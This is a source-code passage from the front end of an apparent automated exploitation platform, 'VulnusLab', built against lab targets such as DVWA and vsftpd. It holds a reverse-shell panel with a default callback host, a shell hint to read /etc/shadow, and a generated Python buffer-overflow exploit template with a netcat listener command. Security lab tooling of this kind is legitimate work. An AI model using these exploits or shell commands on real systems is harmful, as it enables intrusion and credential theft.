    borderRadius: 10, padding: 16, marginBottom: 14};
  const panelHead  = {fontSize: 11, fontWeight: 800, letterSpacing: 1.5,
    color: "#fca5a5", marginBottom: 12, display: "flex", alignItems: "center", gap: 8};

  const renderField = (f) => {
    const value = fieldValues[f.id] ?? "";
    const disabled = f.disabledKey && selected ? selected[f.disabledKey] === false : false;
    // CVSS gets severity coloring automatically
    const dynamicColor = (f.id === "cvss" && selected) ? sevColor(selected.cvss) : f.color;
    const fieldStyle = {...inputStyle,
      ...(f.readOnly ? {background: "#0a1224"} : {}),
      ...(dynamicColor ? {color: dynamicColor} : {}),
      ...(f.id === "cvss" ? {fontWeight: 800} : {}),
      ...(disabled ? {opacity: 0.5} : {}),
    };
    return (
      <div key={f.id}>
        <label style={labelStyle}>{f.label}</label>
        <input value={String(value)}
          onChange={f.readOnly ? undefined : (ev) => setField(f.id, ev.target.value)}
          readOnly={!!f.readOnly}
          disabled={disabled}
          placeholder={disabled ? "(not used by this module)" : (f.placeholder || "")}
          style={fieldStyle}/>
      </div>
    );
  };

  // Group "half"-width fields into 2-column rows
  const renderFieldRows = () => {
    const rows = [];
    let i = 0;
    while (i < configFields.length) {
      const f = configFields[i];
      const next = configFields[i + 1];
      if (f.width === "half" && next && next.width === "half") {
        rows.push(
          <div key={i} style={{display: "grid", gridTemplateColumns: "1fr 1fr", gap: 10, marginBottom: 12}}>
            {renderField(f)}{renderField(next)}
          </div>
        );
        i += 2;
      } else {
        rows.push(<div key={i} style={{marginBottom: 12}}>{renderField(f)}</div>);
        i += 1;
      }
    }
    return rows;
  };

  return (
    <div className="fade" style={{maxWidth: 1500, margin: "0 auto"}}>
      {/* Title row */}
      <div style={{display: "flex", alignItems: "flex-start", justifyContent: "space-between",
        marginBottom: 18, gap: 14, flexWrap: "wrap"}}>
        <div>
          <div style={{fontSize: 22, fontWeight: 900, color: "#f1f5f9", lineHeight: 1.1}}>
            {title}
          </div>
          {subtitle && <div style={{fontSize: 11, color: "#64748b", marginTop: 4}}>{subtitle}</div>}
        </div>
        {onDownloadReport && (
          <button onClick={downloadReport}
            style={{padding: "9px 18px", fontSize: 12, fontWeight: 800, letterSpacing: 1,
              background: "linear-gradient(135deg, #ea580c, #c2410c)",
              color: "#fff", border: "none", borderRadius: 6, cursor: "pointer",
              boxShadow: "0 4px 12px rgba(234,88,12,0.3)"}}>
            📄 Report
          </button>
        )}
      </div>

      {/* Two-column body */}
      <div style={{display: "grid", gridTemplateColumns: "320px 1fr", gap: 18,
        alignItems: "flex-start"}}>

        {/* LEFT: Target Configuration + Phase Runners */}
        <div>
          <div style={panelStyle}>
            <div style={panelHead}>
              <span>🎯</span> <span>Target Configuration</span>
            </div>

            {catalogFetchUrl && (
              <>
                <label style={labelStyle}>Module</label>
                <select value={selectedId}
                  onChange={(ev) => setSelectedId(ev.target.value)}
                  style={{...inputStyle, marginBottom: 12}}>
                  {catalog.map(e => <option key={e.id} value={e.id}>{e.name}</option>)}
                </select>
              </>
            )}

            {renderFieldRows()}

            {selected && (selected.service || selected.category) && (
              <div style={{marginTop: 10, fontSize: 10, color: "#64748b"}}>
                {selected.service && <>Service: <span style={{color: "#e2e8f0"}}>{selected.service}</span></>}
                {selected.service && selected.category && <span style={{margin: "0 6px"}}>·</span>}
                {selected.category && <>Category: <span style={{color: "#e2e8f0"}}>{selected.category}</span></>}
              </div>
            )}
          </div>

          {phases.length > 0 && (
            <div style={panelStyle}>
              <div style={{...panelHead, marginBottom: 6}}>
                <span>🔥</span> <span>Phases (auto-run in sequence)</span>
              </div>
              <div style={{fontSize: 10, color: "#64748b", marginBottom: 10, lineHeight: 1.5}}>
                Clicking AUTO-RUN fires all phases below in order.
              </div>
              {phases.map(p => (
                <div key={p.n}
                  style={{padding: "10px 12px", marginBottom: 8, borderRadius: 6,
                    background: "#020617", border: "1px solid #1e293b",
                    display: "flex", alignItems: "center", gap: 10}}>
                  <div style={{width: 24, height: 24, borderRadius: "50%",
                    background: `linear-gradient(135deg, ${color}, #7f1d1d)`,
                    display: "flex", alignItems: "center", justifyContent: "center",
                    fontSize: 11, fontWeight: 900, color: "#fff", flexShrink: 0}}>
                    {p.n}
                  </div>
                  <div style={{flex: 1, minWidth: 0}}>
                    <div style={{fontSize: 12, fontWeight: 700, color: "#f1f5f9"}}>{p.name}</div>
                    <div style={{fontSize: 10, color: "#64748b"}}>{p.tool}</div>
                  </div>
                </div>
              ))}
            </div>
          )}

          {isRunning ? (
            <button onClick={stopRunning}
              style={{width: "100%", padding: "14px 18px", fontSize: 13, fontWeight: 900, letterSpacing: 1.5,
                background: "linear-gradient(135deg, #f59e0b, #b45309)",
                color: "#fff", border: "none", borderRadius: 10, cursor: "pointer",
                boxShadow: "0 6px 20px rgba(245,158,11,0.45)"}}>
              ⏹ STOP
            </button>
          ) : (
            <button onClick={runSelected} disabled={!selected}
              style={{width: "100%", padding: "14px 18px", fontSize: 13, fontWeight: 900, letterSpacing: 1.5,
                background: `linear-gradient(135deg, ${color}, #991b1b)`,
                color: "#fff", border: "none", borderRadius: 10, cursor: "pointer",
                boxShadow: `0 6px 20px ${color}55`}}>
              🚀 AUTO-RUN (All Phases)
            </button>
          )}
        </div>

        {/* RIGHT: Tabs */}
        <div>
          <div style={{display: "flex", gap: 2, marginBottom: 0,
            background: "#0f172a", borderRadius: "10px 10px 0 0",
            border: "1px solid #1e293b", borderBottom: "none", padding: "4px 4px 0"}}>
            {[
              {id: "log",    label: "Auto-Run LOG"},
              {id: "result", label: "Results"},
              ...(hasInteractiveShell ? [{id: "shell", label: isInteractive ? "Live Shell" : "Extracted Data"}] : []),
            ].map(t => (
              <button key={t.id} onClick={() => setActiveTab(t.id)}
                style={{padding: "10px 18px", fontSize: 11, fontWeight: 800, letterSpacing: 1,
                  background: activeTab === t.id ? "#2563eb" : "transparent",
                  color: activeTab === t.id ? "#fff" : "#94a3b8",
                  border: "none", borderRadius: "6px 6px 0 0", cursor: "pointer"}}>
                {t.label}
              </button>
            ))}
          </div>

          <div style={{background: "#0a1224", border: "1px solid #1e293b",
            borderRadius: "0 10px 10px 10px", marginBottom: 14, padding: 0, overflow: "hidden"}}>

            {/* LOG */}
            {activeTab === "log" && (
              <div ref={logRef} style={{padding: "18px 22px",
                fontFamily: "'JetBrains Mono', Consolas, monospace",
                fontSize: 12, minHeight: 340, maxHeight: 520, overflowY: "auto", lineHeight: 1.7}}>
                {logLines.length === 0 ? (
                  <div style={{color: "#64748b", fontStyle: "italic"}}>
                    Click <strong style={{color}}>AUTO-RUN</strong> to fire the selected module and watch phase progress here.
                  </div>
                ) : logLines.map((line, i) => (
                  <div key={i} style={{color: line.color, whiteSpace: "pre-wrap", wordBreak: "break-word"}}>
                    <span style={{color: "#475569", marginRight: 8}}>{line.ts}</span>{line.text}
                  </div>
                ))}
              </div>
            )}

            {/* RESULTS */}
            {activeTab === "result" && (
              <div style={{padding: "18px 22px", minHeight: 340, maxHeight: 520, overflowY: "auto"}}>
                {!r ? (
                  <div style={{color: "#64748b", fontStyle: "italic"}}>
                    No results yet — run the selected module to populate this tab.
                  </div>
                ) : (
                  <>
                    <div style={{display: "flex", alignItems: "center", gap: 10, marginBottom: 14}}>
                      <span style={{fontSize: 18}}>{r.ok ? "✅" : "❌"}</span>
                      <span style={{fontSize: 14, fontWeight: 900, letterSpacing: 1.5,
                        color: r.ok ? "#4ade80" : "#f87171"}}>
                        {r.ok ? "EVIDENCE OF COMPROMISE" : "FAILURE REASON"}
                      </span>
                    </div>
                    <div style={{padding: "12px 14px", borderRadius: 8, marginBottom: 14,
                      background: r.ok ? "rgba(34,197,94,0.08)" : "rgba(220,38,38,0.08)",
                      border: `1px solid ${r.ok ? "rgba(34,197,94,0.35)" : "rgba(220,38,38,0.35)"}`,
                      fontSize: 13, color: "#cbd5e1", lineHeight: 1.6}}>
                      {r.ok ? (r.evidence || "Success") : r.error}
                    </div>

                    {/* "What to try" hint surfaced from the backend on failure or
                        when an auto-recovery happened. Helps customers self-serve
                        instead of opening a support ticket. */}
                    {r.suggested_action && (
                      <div style={{padding: "11px 14px", borderRadius: 8, marginBottom: 14,
                        background: "rgba(251,191,36,0.10)",
                        border: "1px solid rgba(251,191,36,0.35)",
                        fontSize: 12, color: "#fde68a", lineHeight: 1.6}}>
                        <span style={{color: "#fbbf24", fontWeight: 800, marginRight: 6}}>💡 What to try:</span>
                        {r.suggested_action}
                      </div>
                    )}

                    {r.auto_recovered && (
                      <div style={{padding: "9px 12px", borderRadius: 8, marginBottom: 14,
                        background: "rgba(59,130,246,0.10)",
                        border: "1px solid rgba(59,130,246,0.35)",
                        fontSize: 11, color: "#bfdbfe", lineHeight: 1.5}}>
                        <span style={{color: "#60a5fa", fontWeight: 800, marginRight: 6}}>♻ Auto-recovery:</span>
                        We detected a stuck lab container and restarted it automatically before retrying.
                      </div>
                    )}

                    {r.payload && (
                      <div style={{marginBottom: 14}}>
                        <div style={{fontSize: 10, fontWeight: 800, color: "#64748b",
                          letterSpacing: 1.5, marginBottom: 6}}>PAYLOAD</div>
                        <div style={{padding: "10px 12px", background: "#000",
                          borderRadius: 6, fontFamily: "'JetBrains Mono', monospace",
                          fontSize: 11, color: "#fbbf24", wordBreak: "break-all", lineHeight: 1.6}}>
                          {r.payload}
                        </div>
                      </div>
                    )}

                    {r.ok && r.rows && Array.isArray(r.rows) && r.rows.length > 0 && (
                      <div style={{marginBottom: 14}}>
                        <div style={{fontSize: 10, fontWeight: 800, color: "#64748b",
                          letterSpacing: 1.5, marginBottom: 6}}>EXTRACTED RECORDS ({r.rows.length})</div>
                        <div style={{background: "#000", borderRadius: 6, padding: "10px 12px",
                          fontFamily: "'JetBrains Mono', monospace", fontSize: 11,
                          color: "#bfdbfe", maxHeight: 240, overflowY: "auto"}}>
                          {r.rows.slice(0, 30).map((row, i) => (
                            <div key={i} style={{padding: "3px 0"}}>
                              <span style={{color: "#86efac"}}>{String(row[0] || "").padEnd(22)}</span>
                              <span style={{color: "#fbbf24"}}>{row[1] || ""}</span>
                            </div>
                          ))}
                          {r.rows.length > 30 && (
                            <div style={{color: "#64748b", marginTop: 6, fontStyle: "italic"}}>
                              … and {r.rows.length - 30} more
                            </div>
                          )}
                        </div>
                      </div>
                    )}

                    {r.ok && r.jwt && (
                      <div style={{marginBottom: 14}}>
                        <div style={{fontSize: 10, fontWeight: 800, color: "#64748b",
                          letterSpacing: 1.5, marginBottom: 6}}>EXTRACTED JWT</div>
                        <div style={{padding: "10px 12px", background: "#000",
                          borderRadius: 6, fontFamily: "'JetBrains Mono', monospace",
                          fontSize: 11, color: "#fbbf24", wordBreak: "break-all"}}>
                          {r.jwt}
                        </div>
                      </div>
                    )}
                  </>
                )}
              </div>
            )}

            {/* SHELL */}
            {activeTab === "shell" && hasInteractiveShell && (
              <div>
                <div style={{padding: "10px 16px",
                  background: isInteractive ? "#052e16" : "#0c1c3a",
                  borderBottom: `1px solid ${isInteractive ? "#14532d" : "#1e3a8a"}`,
                  display: "flex", alignItems: "center", justifyContent: "space-between",
                  flexWrap: "wrap", gap: 8}}>
                  <div style={{display: "flex", alignItems: "center", gap: 10}}>
                    <span style={{fontSize: 14}}>{isInteractive ? "🐚" : "📊"}</span>
                    <span style={{fontSize: 12, fontWeight: 800, letterSpacing: 1.2,
                      color: isInteractive ? "#86efac" : "#93c5fd"}}>
                      {activeShell ? (isInteractive ? "LIVE SHELL" : "EXTRACTED DATA") : "SHELL — Waiting for connection…"}
                    </span>
                    {activeShell && (
                      <span style={{fontSize: 10, color: "#94a3b8", fontFamily: "'JetBrains Mono', monospace"}}>
                        sid={activeShell.sid} ·
                        <span style={{color: shellStatus === "live" ? "#4ade80"
                          : shellStatus === "error" ? "#f87171" : "#fbbf24"}}>
                          {" "}{shellStatus}
                        </span>
                      </span>
                    )}
                  </div>
                  {activeShell && (
                    <div style={{display: "flex", gap: 6}}>
                      <button onClick={copyOutput}
                        style={{padding: "5px 10px", fontSize: 10, fontWeight: 700,
                          background: "#1e293b", color: "#cbd5e1",
                          border: "1px solid #334155", borderRadius: 4, cursor: "pointer"}}>📋 COPY</button>
                      <button onClick={closeShell}
                        style={{padding: "5px 10px", fontSize: 10, fontWeight: 700,
                          background: "#7f1d1d", color: "#fff", border: "none",
                          borderRadius: 4, cursor: "pointer"}}>✕ CLOSE</button>
                    </div>
                  )}
                </div>
                <div ref={outRef} style={{padding: "18px 22px", background: "#000",
                  color: isInteractive ? "#4ade80" : "#bfdbfe",
                  fontFamily: "'JetBrains Mono', Consolas, monospace",
                  fontSize: 13, minHeight: 300, maxHeight: 440, overflowY: "auto",
                  whiteSpace: "pre-wrap", wordBreak: "break-word", lineHeight: 1.65}}>
                  {shellOutput || (activeShell
                    ? (isInteractive ? "Waiting for shell output…\n" : "Loading extracted data…\n")
                    : "Waiting for reverse shell connection…")}
                </div>
                <div style={{padding: 12, background: "#050a16",
                  borderTop: "1px solid #1e293b",
                  display: "flex", gap: 8, alignItems: "center"}}>
                  {isInteractive && activeShell ? (
                    <>
                      {/* Decoy inputs that absorb Chrome's username/password autofill so
                          the real shell input stays clean. Off-screen, untabbable. */}
                      <div aria-hidden="true" style={{position:"absolute", left:"-9999px", top:0,
                        width:1, height:1, overflow:"hidden", opacity:0, pointerEvents:"none"}}>
                        <input type="text"     name="username" tabIndex={-1} autoComplete="username"          defaultValue=""/>
                        <input type="password" name="password" tabIndex={-1} autoComplete="current-password" defaultValue=""/>
                      </div>
                      <span style={{color: "#4ade80", fontFamily: "monospace", fontSize: 15, fontWeight: 800}}>$</span>
                      <input ref={inputRef}
                        value={shellCmd} onChange={ev => setShellCmd(ev.target.value)}
                        onKeyDown={onKeyDown}
                        type="search"
                        placeholder="run a command  (id · whoami · cat /etc/shadow · ↑/↓ history)"
                        autoComplete="off"
                        name="vl-shell-x"
                        role="presentation"
                        aria-autocomplete="none"
                        data-form-type="other"
                        data-lpignore="true"
                        data-1p-ignore="true"
                        spellCheck={false}
                        style={{flex: 1, padding: "9px 11px", background: "#000",
                          color: "#4ade80", border: "1px solid #14532d", borderRadius: 5,
                          fontFamily: "'JetBrains Mono', monospace", fontSize: 13, outline: "none"}}/>
                      <button onClick={sendCmd}
                        style={{padding: "9px 22px",
                          background: "linear-gradient(135deg, #22c55e, #16a34a)",
                          color: "#000", fontWeight: 800, letterSpacing: 1.5,
                          border: "none", borderRadius: 5, cursor: "pointer", fontSize: 12,
                          boxShadow: "0 2px 8px rgba(34,197,94,0.3)"}}>SEND</button>
                    </>
                  ) : (
                    <span style={{fontSize: 11, color: "#94a3b8", fontStyle: "italic"}}>
                      {activeShell ? "📊 One-shot data dump — no interactive shell" : "⏱ waiting for shell…"}
                    </span>
                  )}
                </div>
              </div>
            )}
          </div>

          {/* Status pills */}
          <div style={{display: "flex", gap: 8, flexWrap: "wrap"}}>
            <span style={{padding: "5px 10px", fontSize: 10, fontWeight: 700,
              background: "rgba(34,197,94,0.12)", color: "#4ade80", borderRadius: 5,
              border: "1px solid rgba(34,197,94,0.3)"}}>✓ {successCount} success</span>
            <span style={{padding: "5px 10px", fontSize: 10, fontWeight: 700,
              background: "rgba(220,38,38,0.12)", color: "#f87171", borderRadius: 5,
              border: "1px solid rgba(220,38,38,0.3)"}}>✗ {failedCount} failed</span>
            <span style={{padding: "5px 10px", fontSize: 10, fontWeight: 700,
              background: "rgba(100,116,139,0.12)", color: "#94a3b8", borderRadius: 5,
              border: "1px solid rgba(100,116,139,0.3)"}}>○ {notRunCount} not run</span>
          </div>
        </div>
      </div>
    </div>
  );
}


/* ═══════════════════════════════════════════════════════════════════════════
   ExploitationModule — thin wrapper that configures ShellPanel for the
   /api/exploit/* endpoints + catalog. Adopting this pattern in every
   module gives us a single source of truth for the form+log+shell UI.
*/
function ExploitationModule({token, apiUrl}) {
  return <ShellPanel
    title="Exploitation Techniques"
    subtitle="direct-socket exploits · vsftpd · DVWA cmdi · DVWA SQLi · Juice Shop · bWAPP · zero false positives"
    icon="💥"
    color="#dc2626"

    catalogFetchUrl="/api/exploit/catalog"
    catalogKey="exploits"

    configFields={[
      {id: "target",      label: "Target IP / Host",      catalogKey: "target"},
      {id: "port",        label: "Port",                  catalogKey: "port",  width: "half"},
      {id: "lport",       label: "LPORT (listener)",      defaultValue: 4444, width: "half", disabledKey: "lport_needed"},
      {id: "lhost",       label: "LHOST (callback host)", defaultValue: "c2.vulnuslab.com", disabledKey: "lhost_needed"},
      {id: "cve",         label: "CVE / Reference",       catalogKey: "cve",   readOnly: true, color: "#fbbf24",  width: "half"},
      {id: "cvss",        label: "CVSS",                  catalogKey: "cvss",  readOnly: true, width: "half"},
      {id: "format",      label: "Result Type",           computedFrom: (c) => c.interactive ? "Interactive shell" : "Data extraction", readOnly: true, color: "#86efac"},
    ]}

    phases={[
      {n: 1, name: "Pre-Flight Check",   tool: "DNS + port reachability"},
      {n: 2, name: "Send Exploit",       tool: "trigger payload"},
      {n: 3, name: "Verify Compromise",  tool: "validate response / id"},
      {n: 4, name: "Capture Output",     tool: "shell or data exfil"},
    ]}

    runEndpoint="/api/exploit/run"
    buildRunBody={(selected, values) => {
      const body = {exploit_id: selected.id};
      const defaultTgt = String(selected.target);
      const defaultPort = selected.port;
      if (values.target && String(values.target) !== defaultTgt)        body.target = String(values.target);
      if (values.port   && parseInt(values.port, 10) !== defaultPort)   body.port   = parseInt(values.port, 10);
      return body;
    }}

    hasInteractiveShell
    shellEndpoints={{
      output: (sid) => `/api/exploit/shell/${sid}/output`,
      cmd:    (sid) => `/api/exploit/shell/${sid}/cmd`,
      close:  (sid) => `/api/exploit/shell/${sid}/close`,
    }}
    isInteractiveFor={(c) => c?.interactive === true}

    onDownloadReport={(all) => generateExploitReport({results: all, date: new Date().toLocaleString()})}

    token={token} apiUrl={apiUrl}
  />;
}


function generateBOFReport({targetIP, targetPort, prefix, crashAt, eipValue, offset, badChars, jmpEsp, jmpModule, lhost, lport, payload, shellcode, notes, scripts, date}) {
  const _doGen = () => {
    const doc = new jsPDF({unit:"mm", format:"a4"});
    const pageW=210, margin=12, contentW=pageW-margin*2;
    const BLUE=[59,130,246], DARK=[15,23,42], GRAY=[100,116,139];
    const LIGHT=[241,245,249], WHITE=[255,255,255], LBLUE=[220,230,245];
    const GREEN=[22,163,74], RED=[220,38,38];
    let y=18, _sn=0;
    const fillR=(x,yy,w,h,c)=>{doc.setFillColor(...c);doc.rect(x,yy,w,h,"F");};
    const txt=(t,x,yy,sz,c,bold,align)=>{doc.setFont("Arial",bold?"bold":"normal");doc.setFontSize(sz||10);doc.setTextColor(...(c||DARK));doc.text(String(t),x,yy,{align:align||"left"});};
    const chk=n=>{if(y+n>278){doc.addPage();y=18;drawHdr();}};
    const sHead=(title,yy)=>{_sn++;fillR(margin,yy,contentW,9,LBLUE);txt(_sn+". "+title,margin+4,yy+6.2,10,BLUE,true);return yy+13;};
    const drawHdr=()=>{txt("VulnusLab — Buffer Overflow Report",margin,10,7,GRAY);txt(date,pageW-margin,10,7,BLUE,false,"right");};
    const CODE_BG=[232,240,255], CODE_FG=[15,30,80];
    const mono=(t,x,yy,sz)=>{doc.setFont("Courier","normal");doc.setFontSize(sz||7.5);doc.setTextColor(...CODE_FG);doc.text(String(t),x,yy);};

    // Cover
    fillR(0,0,pageW,64,DARK);
    // VulnusLab shield logo + wordmark
    {
      const sx = pageW/2, sy = 14, w = 12, h = 14;
      doc.setFillColor(15,23,42);
      doc.setDrawColor(59,130,246); doc.setLineWidth(0.6);
      doc.lines([
        [w*0.45,0],[w*0.55,h*0.15],[0,h*0.5],
        [-w*0.55,h*0.5],[-w*0.45,-h*0.15],[-w*0.45,-h*0.4],
        [0,-h*0.1],[w*0.45,-h*0.4],[0,h*0.4]
      ], sx-w*0.45, sy-h*0.4, [1,1], 'FD');
      doc.setFont("helvetica","bold"); doc.setFontSize(10); doc.setTextColor(59,130,246);
      doc.text("V", sx, sy + 1, {align:"center"});
      doc.setFont("helvetica","bold"); doc.setFontSize(7);
      doc.setTextColor(241,245,249);
      doc.text("VULNUS", sx - 1, sy + 10, {align:"right"});
      doc.setTextColor(59,130,246);
      doc.text("LAB", sx, sy + 10, {align:"left"});
    }
    txt("BUFFER OVERFLOW REPORT",pageW/2,38,17,[255,255,255],true,"center");
    txt("Stack-Based Exploitation — OSCP Methodology",pageW/2,48,10,GRAY,false,"center");
    y=74;
    const rows=[["Target",`${targetIP||"—"}:${targetPort||"—"}`],["Prefix",prefix||"—"],["Date",date],["Classification","CONFIDENTIAL"],["Report Type","Buffer Overflow Exploitation"]];
    fillR(margin,y,contentW,8,DARK); txt("FIELD",margin+3,y+5.5,8,WHITE,true); txt("VALUE",margin+55,y+5.5,8,WHITE,true); y+=8;
    rows.forEach(([f,v],i)=>{fillR(margin,y,contentW,8,i%2===0?LIGHT:WHITE);txt(f,margin+3,y+5.5,8.5,GRAY,true);txt(String(v),margin+55,y+5.5,8.5,DARK);y+=8;});
    y+=10;

    // Exploitation Summary
    chk(60); y=sHead("Exploitation Summary",y);
    const sumRows=[
      ["Crash Point",crashAt ? `~${crashAt} bytes` : "?? bytes",""],
      ["EIP Offset",offset ? `${offset} bytes` : "Not found",""],
      ["EIP Value (pattern)",eipValue||"Not recorded",""],
      ["Bad Characters",badChars||"None identified",""],
      ["JMP ESP Address",jmpEsp||"Not found",jmpModule||""],
      ["LHOST / LPORT",`${lhost||"??"} / ${lport||"4444"}`,""],
      ["Payload",payload||"—",""],
    ];
    fillR(margin,y,contentW,8,DARK);
    txt("PARAMETER",margin+3,y+5.5,8,WHITE,true);txt("VALUE",margin+55,y+5.5,8,WHITE,true);txt("MODULE",margin+120,y+5.5,8,WHITE,true);y+=8;
    sumRows.forEach(([f,v,m],i)=>{
      fillR(margin,y,contentW,8,i%2===0?LIGHT:WHITE);
      txt(f,margin+3,y+5.5,8.5,GRAY,true);
      const col=v&&v!=="Not found"&&v!=="Not found"?GREEN:RED;
      txt(v,margin+55,y+5.5,8.5,col,true);
      if(m) txt(m,margin+120,y+5.5,7.5,GRAY);
      y+=8;
    }); y+=8;

    doc.addPage(); y=18; drawHdr();

    // Each Phase notes + scripts
    BOF_PHASES.forEach((ph)=>{
      const n = notes[String(ph.id)]||"";
      const script = scripts ? scripts[ph.id] : null;
      // Calculate block height before placing heading to avoid orphaned headers
      const scriptLines = script ? script.split("\n").flatMap(line=>{
        // wrap long lines so shellcode doesn't overflow
        const chunks=[]; let s=line;
        while(s.length>86){chunks.push(s.substring(0,86));s=s.substring(86);}
        chunks.push(s); return chunks;
      }) : [];
      const scriptH = script ? scriptLines.length*5+8 : 0;
      const noteLines = n.trim() ? doc.splitTextToSize(n,contentW-8) : [];
      const noteH = n.trim() ? Math.max(10,noteLines.length*4.5+6) : 0;
      const totalH = 24 + noteH + (noteH>0?6:0) + scriptH;
      const fitsOnePage = totalH <= 256;
      // If fits on one page: ensure enough room before heading, then NO inner chk
      if(fitsOnePage && y+totalH>278){ doc.addPage(); y=18; drawHdr(); }
      else if(!fitsOnePage){ chk(24); }
      y=sHead(`Phase ${ph.id}: ${ph.name}`,y);
      fillR(margin,y,contentW,7,LIGHT); txt(ph.desc,margin+4,y+5,8.5,GRAY); y+=11;
      // Notes
      if(n.trim()){
        if(!fitsOnePage) chk(noteH+4);
        fillR(margin,y,contentW,noteH,[240,253,244]);
        fillR(margin,y,3,noteH,GREEN);
        doc.setFont("Arial","normal");doc.setFontSize(8);doc.setTextColor(...DARK);
        doc.text(noteLines,margin+6,y+5);
        y+=noteH+6;
      }
      // Generated script
      if(script){
        if(!fitsOnePage) chk(scriptH+4);
        fillR(margin,y,contentW,scriptH,CODE_BG);
        fillR(margin,y,3,scriptH,BLUE);
        scriptLines.forEach((line,li)=>{
          mono(line, margin+6, y+5+li*5, 6.8);
        });
        y+=scriptH+5;
      }
      if(!n.trim()&&!script){
        fillR(margin,y,contentW,7,[254,242,242]);txt("No notes recorded for this phase.",margin+4,y+5,8,GRAY);y+=11;
      }
    });

    // Final exploit script
    if(offset&&jmpEsp){
      const leBytes=jmpEsp.replace(/0x/i,"").match(/../g)?.reverse().map(h=>"\\x"+h).join("")||"\\x??\\x??\\x??\\x??";
      const script=[
        `import socket`,``,
        `target  = "${targetIP||'TARGET_IP'}"`,
        `port    = ${targetPort||9999}`,
        `prefix  = "${prefix||'OVERFLOW1 '}"`,
        `offset  = ${offset}`,
        `retn    = b"${leBytes}"   # ${jmpEsp} little-endian`,
        `padding = b"\\x90" * 16   # NOP sled`,
        `# Paste msfvenom output here:`,
        `shellcode = b"${shellcode||'# PASTE SHELLCODE'}"`,``,
        `payload  = prefix.encode() + b"A" * offset + retn + padding + shellcode`,
        `s = socket.socket()`,
        `s.connect((target, port))`,
        `s.recv(1024)`,
        `s.send(payload + b"\\r\\n")`,
        `print("[*] Exploit sent! Catch shell: nc -lvnp ${lport||4444}")`,
      ];
      const fsLines=script.flatMap(line=>{
        const chunks=[]; let s=line;
        while(s.length>86){chunks.push(s.substring(0,86));s="  "+s.substring(86);}
        chunks.push(s); return chunks;
      });
      const fsH=fsLines.length*5.5+8;
      chk(fsH+20); y=sHead("Final Exploit Script",y);
      fillR(margin,y,contentW,fsH,CODE_BG); fillR(margin,y,3,fsH,GREEN);
      fsLines.forEach((line,li)=>{ mono(line,margin+6,y+5.5+li*5.5,7.5); });
      y+=fsH+6;
      y+=6;
    }

    // End of report contact block
    chk(34);
    const eY = y + 4;
    fillR(margin, eY, contentW, 30, LIGHT);
    fillR(margin, eY, 3, 30, BLUE);
    txt("— END OF REPORT —", pageW/2, eY+8, 10, BLUE, true, "center");
    txt("Generated by VulnusLab — automated exploitation testing by VulnusLab engine.", pageW/2, eY+14, 6.5, GRAY, false, "center");
    txt("All findings require manual verification. This document is CONFIDENTIAL — restricted to authorized personnel only.", pageW/2, eY+18, 6, GRAY, false, "center");
    txt("vulnuslab.com  ·  support@vulnuslab.com", pageW/2, eY+25, 7, BLUE, true, "center");

    // Footer on all pages
    const total=doc.internal.getNumberOfPages();
    for(let i=1;i<=total;i++){
      doc.setPage(i);
      doc.setDrawColor(...BLUE);doc.setLineWidth(1.2);doc.rect(0,0,210,297,"S");
      if(i>=2){txt("VulnusLab | CONFIDENTIAL  ·  vulnuslab.com",margin,290,6.5,GRAY);txt("Page "+i+" of "+total,pageW-margin,290,6.5,BLUE,false,"right");}
    }
    doc.save(`bof_${_pdfFn(targetIP)}_${_pdfDt()}.pdf`);
  };
  _doGen();
}

// ── EMBEDDED TERMINAL WIDGET ──────────────────────────────────
function TerminalWidget({apiUrl, title, color, presetCmds, onClose}) {
  const [sid,      setSid]      = useState(null);
  const [output,   setOutput]   = useState("");
  const [input,    setInput]    = useState("");
  const [history,  setHistory]  = useState([]);
  const [hIdx,     setHIdx]     = useState(-1);
  const [loading,  setLoading]  = useState(false);
  const outRef = useRef(null);
  const pollRef = useRef(null);

  const post = async (ep, body={}) => {
    const r = await fetch(`${apiUrl}${ep}`,{method:"POST",
      headers:{"Content-Type":"application/json","Authorization":`Bearer ${getAuthToken()}`},
      body:JSON.stringify(body)});
    return r.json();
  };

  const startSession = async () => {
    setLoading(true);
    try {
      const d = await post("/api/terminal/create");
      if(!d.session_id) throw new Error("No session");
      setSid(d.session_id);
      setOutput(""); setLoading(false);
      // Poll terminal output every 2s instead of 800ms — same
      // user-experience but 60% less backend load. Also skips when the
      // tab is hidden so dashboards left open in background tabs don't
      // hammer the API. Server-side buffer drains on return.
      pollRef.current = setInterval(async()=>{
        if (typeof document !== "undefined" && document.hidden) return;
        try {
          const o = await post("/api/terminal/output",{session_id:d.session_id});
          if(o.output !== undefined) setOutput(o.output);
          if(outRef.current) outRef.current.scrollTop=outRef.current.scrollHeight;
        } catch(e){}
      },2000);
    } catch(e) {
      setOutput("⚠ Backend not running\nStart uvicorn on Kali:\ncd ~/Cyber-project && uvicorn main:app --host 0.0.0.0 --port 8000 --reload");
      setLoading(false);
    }
  };

  const sendCmd = async (cmd) => {
    if(!cmd.trim()) return;
    if(!sid){ setOutput(p=>p+"\n⚠ No session — backend not running"); return; }
    setHistory(p=>[cmd,...p.filter(x=>x!==cmd)].slice(0,20));
    setHIdx(-1); setInput("");
    try { await post("/api/terminal/input",{session_id:sid,input:cmd}); }
    catch(e){ setOutput(p=>p+"\n⚠ Send failed: "+e.message); }
  };

  useEffect(()=>{
    startSession();
    return ()=>{ if(pollRef.current) clearInterval(pollRef.current); };
  },[]);

  const BC = "#020617"; const C = color||"#22c55e";

  return (
    <div style={{background:BC,border:`1px solid ${C}44`,borderRadius:10,display:"flex",flexDirection:"column",height:"100%",minHeight:280}}>
      {/* Title bar */}
      <div style={{display:"flex",alignItems:"center",gap:8,padding:"6px 10px",background:"#0a0f1e",borderBottom:`1px solid ${C}33`,borderRadius:"10px 10px 0 0",flexShrink:0}}>
        <div style={{width:8,height:8,borderRadius:"50%",background:sid?"#22c55e":"#ef4444"}}/>
        <span style={{color:C,fontSize:11,fontWeight:700,fontFamily:"monospace",flex:1}}>{title}</span>
        {onClose && <button onClick={onClose} style={{background:"none",border:"none",color:"#475569",cursor:"pointer",fontSize:13,padding:"0 4px"}}>✕</button>}
      </div>

      {/* Preset commands */}
      {presetCmds && presetCmds.length>0 && (
        <div style={{display:"flex",flexWrap:"wrap",gap:4,padding:"6px 8px",borderBottom:`1px solid #1e293b`,flexShrink:0}}>
          {presetCmds.map((cmd,i)=>(
            <div key={i} style={{display:"flex",gap:2}}>
              <button onClick={async()=>{ if(cmd.pre){ await sendCmd(cmd.pre); await new Promise(r=>setTimeout(r,900)); } sendCmd(cmd.cmd); }}
